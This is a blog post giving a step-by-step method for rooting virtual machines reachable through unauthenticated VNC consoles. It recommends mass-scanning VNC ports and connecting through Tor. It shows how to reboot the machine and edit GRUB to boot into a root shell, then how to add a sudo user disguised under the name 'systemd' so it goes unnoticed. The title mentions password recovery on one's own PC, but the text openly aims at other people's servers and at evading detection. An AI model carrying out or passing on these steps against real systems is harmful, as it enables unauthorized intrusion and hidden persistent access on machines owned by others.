---
title: "Rooting VNC Virtual Machines (or reseting forgotten pass for your own PC)"
date: 2021-01-10T16:17:00+02:00
author: "Stnby"
---

It is very easy to root a machine if you have access to the bootloader and can change it's boot parameters.

In this tutorial I am going to show common flaw with virtual machines and exposed unauthenticated VNC access.

## Let's get rolling.
To begin with. all you need is a VNC client. Or other sort of hardware access.\
I recommend using [TigerVNC Viewer](https://www.tigervnc.org/).

> Typical ports for VNC are: `5900`, `5901`, `5902`...\
> Go masscan those :*

### Connecting to the VNC server
Using torsocks here because I really doubt you would do this on your own server XD\
This is just to show what an attacker might be using.
```sh
torsocks vncviewer 1.3.3.7
```
At first glance it might look secure. As we have a login prompt and don't know the credentials.
{{< figure src="2021-01-10_16-36.png" title="Login prompt — TigerVNC Viewer (random server)" >}}

### Rebooting the box
But don't forget this VNC is hardware level.\
We can just press `F8` key and click `Send Ctrl-Alt-Del`.
{{< figure src="2021-01-10_16-40.png" title="Rebooting the VM — TigerVNC Viewer (random server)" >}}

While booting up keep spamming `ESC` key until GRUB menu appears.
{{< figure src="2021-01-10_17-02.png" title="Boot selector menu — GRUB" >}}

### Changing boot parameters
Hit `e` to open boot parameter editor and add these changes.\
Replace `ro` with `rw`, add `init=/bin/sh` and also `panic=1` so it does not get stuck in case of kernel panic.\
And press `Ctrl+x` or `F10` to boot.
{{< figure src="2021-01-10_17-05.png" title="Boot parameter editor — GRUB" >}}

### Creating a new user or changing the password for existing one.
```
sh: cannot set terminal process group (-1): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# useradd -m -G sudo -s /bin/sh systemd
sh-5.0# passwd systemd
New password:
Retype new password:
passwd: password updated successfully
sh-5.0# echo b > /proc/sysrq-trigger
```
> Misleading username is a key to being unnoticed.\
> systemd is bloat anyway *(No one really knows what it does)*

## Done. Now just login using your new credentials.
```
Debian GNU/Linux 10 blabla tty1
blabla login: systemd
Password:
Linux blabla 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No directory, logging in with HOME=/
$ sudo sh
[sudo] password for systemd:
sh-5.0# id
uid=0(root) gid=0(root) groups=0(root) sh-5.0#
sh-5.0#
```
